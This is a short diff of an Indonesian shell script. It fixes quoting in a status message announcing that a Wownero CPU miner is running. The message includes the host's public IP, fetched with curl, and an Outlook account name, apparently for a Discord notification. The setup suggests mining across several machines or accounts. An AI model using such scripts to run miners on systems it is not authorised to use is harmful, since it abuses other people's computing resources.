@@ -22,7 +22,7 @@ sleep 5
 if [ ! -f sudah_initiate_discord_wownero.txt ]; then
   touch sudah_initiate_discord_wownero.txt
   pre_message="$@======================================================="
-  message="$@CPUMINER UNTUK WOWNERO SUDAH JALAN : `curl ifconfig.me`" | Outlook Acc : $outlook_user
+  message="$@CPUMINER UNTUK WOWNERO SUDAH JALAN : `curl ifconfig.me` | Outlook Acc : $outlook_user "
   pasca_message="$@======================================================="
   ## format to parse to curl
   ## echo Sending message: $message
